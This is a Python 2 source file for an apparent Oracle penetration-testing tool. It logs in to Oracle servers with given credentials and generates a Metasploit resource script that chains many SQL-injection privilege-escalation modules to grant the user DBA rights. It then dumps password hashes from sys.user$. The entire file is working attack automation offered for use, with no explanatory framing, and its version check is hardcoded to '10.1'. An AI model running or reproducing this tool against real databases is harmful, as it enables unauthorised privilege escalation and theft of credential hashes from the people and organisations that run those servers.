import time
import sys
import csv
import re
import argparse
import urllib
import os.path
import fileinput
import subprocess
import socket
import os
import itertools
from collections import defaultdict
from pprint import pprint
from termcolor import colored
from subprocess import call

sid = ""
metasploitPath = ""
#metasploitPath = "/pentest/metasploit-framework/"

# Made by Keith Lee
# http://milo2012.wordpress.com
# @keith55

try:
	import cx_Oracle
except  ImportError:
	print "[!] Please install cx_Oracle"
	sys.exit()

def msfPrivEscUnknown(username,password,hostname,sid):
	outputMsfFile = "msfresource.rc"
	myfile = open(outputMsfFile, "w")
	
	stmt =  "setg DBUSER "+username+"\n"
	stmt += "setg DBPASS "+password+"\n"
	stmt += "setg SQL grant dba to "+username+"\n"
	stmt += "setg SID "+sid+"\n"
	stmt += "setg RHOST "+hostname+"\n"
	myfile.write(stmt)

	#Last Attempts
	myfile.write("use auxiliary/sqli/oracle/dbms_cdc_publish2\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/dbms_cdc_publish3\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/dbms_metadata_get_granted_xml\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/dbms_metadata_get_xml\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/dbms_metadata_open\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/droptable_trigger\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/lt_compressworkspace\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/lt_mergeworkspace\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/lt_removeworkspace\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("use auxiliary/sqli/oracle/lt_rollbackworkspace\n")
	myfile.write("exploit\n")
	myfile.write("sleep 3\n")
	myfile.write("exit\n")
	myfile.close()	
	command = metasploitPath+"msfconsole -r "+os.getcwd()+"/msfresource.rc"
	print command
	call(command, shell=True)

def msfPrivEsc(username,password,hostname,sid):
	#Check version before doing privilege escalation
	"""
	orcl1 = cx_Oracle.connect(username+"/"+password+"@"+hostname+":1521/"+sid)			
	curs = orcl1.cursor()
	curs.execute("select * from v$version") 
	row = curs.fetchone()
	curs.close()
	oracleVer = str(row)
	"""
	oracleVer = "10.1"

	outputMsfFile = "msfresource.rc"
	myfile = open(outputMsfFile, "w")
	
	stmt =  "setg DBUSER "+username+"\n"
	stmt += "setg DBPASS "+password+"\n"
	stmt += "setg SQL grant dba to "+username+"\n"
	stmt += "setg SID "+sid+"\n"
	stmt += "setg RHOST "+hostname+"\n"

	myfile.write(stmt)

	#if "9.0" in str(row) or "10.1" in str(row) or "10.2" in str(row): 
	if "9.0" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/dbms_export_extension\n")
		myfile.write("exploit\n")
		myfile.write("sleep 3\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_subscribe_activate_subscription\n")	
		myfile.write("exploit\n")
		myfile.write("sleep 3\n")
	
	if "9.0" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_subscribe_activate_subscription\n")
		myfile.write("exploit\n")
		myfile.write("sleep 3\n")
		
	if "10.1" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/dbms_export_extension\n")
		myfile.write("exploit\n")
		myfile.write("sleep 3\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_ipublish\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_publish\n")
		myfile.write("exploit\n")
		myfile.write("sleep 3\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_subscribe_activate_subscription\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/lt_findricset_cursor\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		
	if "10.2" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/dbms_export_extension\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_ipublish\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_publish\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/jvm_os_code_10g\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")

	if "11.0" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/lt_findricset_cursor\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")

	if "11.1" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_ipublish\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/dbms_cdc_publish\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/jvm_os_code_10g\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/jvm_os_code_11g\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/lt_findricset_cursor\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")

	if "11.2" in oracleVer:
		myfile.write("use auxiliary/sqli/oracle/jvm_os_code_11g\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
		myfile.write("use auxiliary/sqli/oracle/lt_findricset_cursor\n")
		myfile.write("sleep 3\n")
		myfile.write("exploit\n")
	myfile.write("exit\n")
	myfile.close()
	command = metasploitPath+"msfconsole -r "+os.getcwd()+"/msfresource.rc"
	print command
	call(command, shell=True)

def dumpHashes(username,password,hostname,sid):
        orcl = cx_Oracle.connect(username+'/'+password+'@'+hostname+':1521/'+sid)
        curs = orcl.cursor()
        curs.execute("SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\'")
        test1 = curs.fetchall()
        print colored("\n[+] Below are the password hashes for SID: "+sid+".","red",attrs=['bold'])
        for i in test1:
               print i
        curs.close()

def checkPermissions(username,password,hostname,sid,firstRun):
	try:
		orcl = cx_Oracle.connect(username+'/'+password+'@'+hostname+':1521/'+sid)
		curs = orcl.cursor()
		curs.execute("select * from v$database")	#Get a list of all databases
		curs.close()
		print colored(str("[+] ["+sid+"]"+" Testing: "+username.strip()+"/"+password.strip()+". (Success)"),"red",attrs=['bold'])
		dumpHashes(username,password,hostname,sid)
		return True
	except cx_Oracle.DatabaseError as e:
		error, = e.args		
		if error.code == 1017:
			print "[-] Testing: "+username.strip()+"/"+password.strip()+". (Fail)"
			sys.exit()
		if error.code == 942:
			if firstRun==True:
				print colored("[+] ["+sid+"]"+" Testing: "+username.strip()+"/"+password.strip()+". (Insufficient Privileges).  Trying to escalate privileges.","red",attrs=['bold'])							
			return False
		
if __name__=="__main__":
	parser = argparse.ArgumentParser(description='Oracle Privilege Escalation')
	parser.add_argument('-host', help='IP or host name of Oracle server')
	parser.add_argument('-hostFile', dest='hostFile', help='File containing IP addresses of oracle servers')
	parser.add_argument('-u', dest='username', help='Use this username to authenticate')
	parser.add_argument('-p', dest='password', help='Use this password to authenticate')	
	parser.add_argument('-sid', dest='sid', help='Use this sid')	
	args = vars(parser.parse_args())

	hostList = []
	counter=0

	if args['host']!=None:
		counter+=1

	if args['hostFile']!=None:
		counter+=1

	if args['hostFile']!=None and args['host']==None:
		for line in open(args['hostFile'],'r'):
			hostList.append(line.strip())

	if args['host']!=None and args['hostFile']==None:	
		hostList.append(args['host'])

	if counter==0 or counter>1:
		print colored("[+] Please use either -host or -hostFile.","red",attrs=['bold'])
		sys.exit(0)

	if args['sid']!=None:
		sid = args['sid']

	#Check if username/password is provided in the command line
	credCount=0
	
	if args['username']!=None:
		credCount+=1
	if args['password']!=None:
		credCount+=1
	if credCount>1 and credCount<2: 
		print "[!] You need to provide both -u and -p."	
		sys.exit(0)	

	#Load hostname		
	for hostname in hostList:
		if len(hostname)<1:
			sys.exit(0)

		socketAvail = False
		try:
			socket.setdefaulttimeout(2)
			s = socket.socket()
			s.connect((hostname,1521))
			socketAvail=True
			print "[+] Connected to "+hostname+":1521"
		except:
			print "[-] Cannot connect to "+hostname+":1521"
		
		if socketAvail==True:
			username = args['username']
			password = args['password']
			print "[+] [SID:"+sid+"] Testing accounts. "
			if checkPermissions(username,password,hostname,sid,firstRun=True)==False:
				print colored("[+] Attempting Metasploit Oracle SQL Privilege Escalation","red",attrs=['bold'])			
				msfPrivEsc(username,password,hostname,sid)
				if checkPermissions(username,password,hostname,sid,firstRun=False)==False:
					print colored("[+] Attempting Addition Oracle SQL Privilege Escalation","red",attrs=['bold'])			
					msfPrivEscUnknown(username,password,hostname,sid)
					if checkPermissions(username,password,hostname,sid,firstRun=False)==False:	
						print colored("[+] ["+sid+"]"+" Result: "+username.strip()+"/"+password.strip()+". (Unable to Escalate to DBA)","red",attrs=['bold'])							
					else:
						print colored("[+] ["+sid+"]"+" Result: "+username.strip()+"/"+password.strip()+". (Successfully escalated to DBA)","red",attrs=['bold'])							
				else:
					print colored("[+] ["+sid+"]"+" Result: "+username.strip()+"/"+password.strip()+". (Successfully escalated to DBA)","red",attrs=['bold'])							
			else:
				print colored("[+] ["+sid+"]"+" Result: "+username.strip()+"/"+password.strip()+". (Successfully escalated to DBA)","red",attrs=['bold'])							
